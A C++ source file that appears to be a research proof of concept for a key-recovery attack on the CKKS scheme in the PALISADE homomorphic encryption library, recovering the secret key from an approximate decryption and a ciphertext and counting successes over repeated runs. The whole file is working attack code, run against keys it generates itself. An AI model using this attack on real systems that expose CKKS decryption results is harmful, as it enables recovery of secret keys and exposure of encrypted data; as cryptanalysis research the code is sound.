// Key recovery attack against the PALISADE implementation of CKKS
#include <palisade/pke/palisade.h>
#include <iostream>

using namespace lbcrypto;

double truncate(double number_val, int n) {
    bool negative = false;
    if (number_val == 0) {
        return 0;
    } else if (number_val < 0) {
        number_val = -number_val;
        negative = true;
    } 
    // int pre_digits = std::log10(number_val) + 1;
    // if (pre_digits < 17) {
    //     int post_digits = 17 - pre_digits;
    //     double factor = std::pow(10, post_digits);
    //     number_val = std::round(number_val * factor) / factor;
    //     factor = std::pow(10, n);
    //     number_val = std::trunc(number_val * factor) / factor;
    // } else {
    //     number_val = std::round(number_val);
    // }
    int pre_digits = std::ceil(std::log2(number_val));
    if (pre_digits < n) {
        int post_digits = n - pre_digits;
        double factor = std::pow(2.0, post_digits);
        // number_val = std::round(number_val * factor) / factor;
        // factor = std::pow(10, n);
        number_val = std::trunc(number_val * factor) / factor;
    } else {
        number_val = std::round(number_val);
    }
    if (negative) {
        number_val = -number_val;
    }
    return number_val;
}

int attack(int perturbation) {
   // Setup CryptoContext
   uint32_t multDepth = 20;        // For this attack the depth is <= 1
   uint32_t scaleFactorBits = 40; // bit-length of the scaling factor
   uint32_t batchSize = 8192;     // For this demo we use just 8 slots

   SecurityLevel securityLevel = HEStd_128_classic; // HEStd_NotSet or HEStd_128_classic; // 128-bit secure

   CryptoContext<DCRTPoly> cc =
      CryptoContextFactory<DCRTPoly>::genCryptoContextCKKS(
         multDepth, scaleFactorBits, batchSize, securityLevel); // can add additional argument for ring dimension
   cc->Enable(ENCRYPTION);
   cc->Enable(SHE);

   std::cout << "CKKS scheme is using ring dimension " << cc->GetRingDimension() << std::endl;

   // Generate the public/private keys
   auto keys = cc->KeyGen();
   // Generate the evaluation key
   cc->EvalMultKeyGen(keys.secretKey);
   // Generate the rotation key
   cc->EvalAtIndexKeyGen(keys.secretKey, {1, -2});

   // The plaintext to be encrypted
   vector<std::complex<double>> x0 = {{1,0}, {5,0}, {10,0},
                                      {100,0}, {1000,0}, {10000,0},
                                      {100000,0}, {100000,0}};
   for (double i = 1; x0.size()<cc->GetRingDimension()/2; i+=1.05) {
      x0.push_back({1.0/i,0});
   }

   // Encoding as plaintexts
   Plaintext ptxt0 = cc->MakeCKKSPackedPlaintext(x0);

   // Encrypt the encoded vectors
   auto c = cc->Encrypt(keys.publicKey, ptxt0);

   // Approximate decryption
   Plaintext errPtxt;
   cc->Decrypt(keys.secretKey, c, &errPtxt);

   // Recover the DCRT representation by encoding the approximate plaintext
   shared_ptr<CKKSPackedEncoding> errEncoded = std::dynamic_pointer_cast<CKKSPackedEncoding>(errPtxt);

   // double scale = errPtxt->GetScalingFactor();
   // Poly noise = errEncoded->GetElement<Poly>();
   // noise.SetFormat(COEFFICIENT);

   // Poly::Vector noiseVec = noise.GetValues();
   // for (size_t i = 0; i < noise.GetLength(); i++) {
   //    noiseVec[i] = perturbation;
   // }
   // noise.SetValues(noiseVec, COEFFICIENT);

   // Plaintext noisePtxt = cc->MakeCKKSPackedPlaintext(x0);
   // shared_ptr<CKKSPackedEncoding> noiseEncoded = std::dynamic_pointer_cast<CKKSPackedEncoding>(noisePtxt);
   // noiseEncoded->GetElement<Poly>() = noise;
   // noiseEncoded->Decode(multDepth, scale, EXACTRESCALE);

   std::vector<std::complex<double>> errValue = errEncoded->GetCKKSPackedValue();
   // std::vector<std::complex<double>> noiseValue = noiseEncoded->GetCKKSPackedValue();
   // char * TRUNC_DIGIT = getenv("TRUNC_DIGIT");
   // int trunc_digit = TRUNC_DIGIT?atoi(TRUNC_DIGIT):-1;
   for (size_t i = 0; i < errValue.size(); i++) {
      // double ere = errValue[i].real();
      // double eim = errValue[i].imag();
      // size_t pos = -std::round(std::log10(noiseValue[i].real()));
      // ere = truncate(ere, trunc_digit>0 ? trunc_digit : pos);
      // pos = -std::round(std::log10(noiseValue[i].imag()));
      // eim = truncate(eim, trunc_digit>0 ? trunc_digit : pos);
      // errValue[i].real(ere);
      // errValue[i].imag(0);      // drop the imagery part
   }

   std::cout << "Encryption numbers:" << std::endl;
   for (size_t i = 0; i < 20 && i < x0.size(); i++) {
      std::cout << i << " : " << x0[i] << std::endl;
   }

   std::cout << "Use these numbers to recover key:" << std::endl;
   for (size_t i = 0; i < 20 && i < errValue.size(); i++) {
      std::cout << i << " : " << errValue[i] << std::endl;
   }
   double maxErrReal = 0;
   double maxErrImag = 0;
   for (size_t i = 0; i < x0.size(); i++) {
      std::complex<double> diff = x0[i] - errValue[i];
      if (fabs(diff.real()) > maxErrReal) {
         maxErrReal = diff.real();
      }
      if (fabs(diff.imag()) > maxErrImag) {
         maxErrImag = diff.imag();
      }
   }
   std::cout << "maxErr = " << log2(maxErrReal) << ", " << log2(maxErrImag) << std::endl;
      
   Plaintext errPtxt1 = cc->MakeCKKSPackedPlaintext(errValue);
   shared_ptr<CKKSPackedEncoding> errEncoded1 = std::dynamic_pointer_cast<CKKSPackedEncoding>(errPtxt1);
   
   errEncoded1->Encode();
   DCRTPoly eCRT = errEncoded1->GetElement<DCRTPoly>();
   eCRT.SetFormat(EVALUATION);
   Poly ePoly = eCRT.CRTInterpolate();
   ePoly.SetFormat(COEFFICIENT);
   {
      // check the difference between the approx decryption (encoded) and the perturbed poly
      Poly errEncodedPoly = errEncoded->GetElement<Poly>();
      errEncodedPoly.SetFormat(COEFFICIENT);

      Poly diff = ePoly - errEncodedPoly;
      diff.SetFormat(COEFFICIENT);
      std::cout << "|errEncoded - errEncoded1| = " << diff.Norm() << std::endl;
   }

   // Retrieve the two components of the ciphertext
   DCRTPoly cb = c->GetElements()[0];
   DCRTPoly ca = c->GetElements()[1];
   ca.SetFormat(EVALUATION);
   cb.SetFormat(EVALUATION);

   // Try to recover the secret key s = (e - cb) / ca
   DCRTPoly caInv =  ca.MultiplicativeInverse();
   DCRTPoly sGuess = (eCRT - cb) * caInv;

   // Retrieve the real secret key s
   LPPrivateKey<DCRTPoly> sk(keys.secretKey);

   size_t towersToDrop = sk->GetPrivateElement().GetParams()->GetParams().size() -
                         cb.GetParams()->GetParams().size();
   auto s(sk->GetPrivateElement());
   s.DropLastElements(towersToDrop);
   return (sGuess == s);
}

int main(int argc, char * argv[]) {
   int iter = 1;
   if (argc >= 2) {
      iter = atoi(argv[1]);
   }
   int perturbation = 0;
   if (argc >= 3) {
      perturbation = atoi(argv[2]);
   }
   int success = 0;
   for (int i = 0; i<iter; i++) {
      if (attack(perturbation)) {
         std::cout << "Found key!" << std::endl;
         success++;
      }
      else std::cout << "Attack failed!" << std::endl;
   }
   std::cout << "Attack worked " << success << " times out of " << iter << std::endl;

   return 0;
}

